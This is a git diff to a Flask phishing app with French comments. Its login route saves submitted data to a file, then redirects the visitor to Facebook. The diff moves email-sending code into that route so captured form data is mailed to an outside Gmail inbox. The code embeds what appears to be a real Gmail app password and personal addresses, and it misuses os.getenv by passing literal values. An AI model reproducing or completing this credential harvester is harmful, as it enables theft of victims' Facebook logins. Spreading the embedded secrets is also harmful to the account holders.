@@ -29,23 +29,12 @@ def login():
     with open(chemin,"a") as f:
         f.write(data)
         print('donnée recuperer : ',data)
+
+    # Tu peux stocker ces infos dans des variables d'environnement
+    EMAIL_SENDER = os.getenv('bettybe446@gmail.com')       # tonemail@gmail.com
+    EMAIL_PASSWORD = os.getenv('ztjg nsyd wfbm tgog')   # mot de passe d'application Gmail
+    EMAIL_RECEIVER = os.getenv('traorefahadaziz446@gmail.com')   # où tu veux recevoir le mail
     
-    print("Donnée enregistré")
-
-    # Rediriger vers le lien
-    return redirect("https://web.facebook.com/?_rdc=1&_rdr#")
-
-
-
-
-
-# Tu peux stocker ces infos dans des variables d'environnement
-EMAIL_SENDER = os.getenv('bettybe446@gmail.com')       # tonemail@gmail.com
-EMAIL_PASSWORD = os.getenv('ztjg nsyd wfbm tgog')   # mot de passe d'application Gmail
-EMAIL_RECEIVER = os.getenv('traorefahadaziz446@gmail.com')   # où tu veux recevoir le mail
-
-@app.route('/send', methods=['POST'])
-def send_email():
     subject = 'Test Email depuis Flask'
     body = f"Message reçu : {request.form.get('message')}"
 
@@ -62,7 +51,13 @@ def send_email():
         return "✅ Email envoyé !"
     except Exception as e:
         return f"❌ Erreur : {e}"
+
     
+    print("Donnée enregistré")
+
+    # Rediriger vers le lien
+    return redirect("https://web.facebook.com/?_rdc=1&_rdr#")
+
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', debug=True)
